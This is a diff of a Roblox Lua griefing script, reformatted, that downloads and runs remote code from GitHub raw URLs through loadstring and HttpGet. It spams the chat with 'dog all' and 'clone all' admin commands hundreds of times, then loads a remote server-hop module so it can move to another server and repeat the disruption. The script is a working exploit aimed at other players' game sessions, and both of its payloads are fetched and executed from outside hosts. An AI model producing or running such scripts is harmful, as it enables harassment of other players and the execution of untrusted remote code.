@@ -1,29 +1,17 @@
-  --[[
- 
- |T|H|I|S| |S|C|R|I|P|T| |W|A|S| |M|A|D|E| |B|Y| |D|I|Z|Z|Y|
- 
- --]]
-
-
-  loadstring(game:HttpGet(('https://raw.githubusercontent.com/DIZZYTHELEGEND/Zmod/main/test'),true))()
-
+loadstring(game:HttpGet('https://raw.githubusercontent.com/DIZZYTHELEGEND/Zmod/main/test'))()
 
 task.wait(1)
 
-for i=1,100 do
-game.Players:Chat("dog all all all")
-end
-for i=1,1000 do
-game.Players:Chat("clone all all all")
+for i = 1, 100 do
+    game.Players:Chat("dog all all all")
 end
 
+for i = 1, 1000 do
+    game.Players:Chat("clone all all all")
+end
 
 task.wait(3)
-    
-    
-    
-    
-    
-    local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
+
+local module = loadstring(game:HttpGet('https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua'))()
 
 module:Teleport(game.PlaceId)
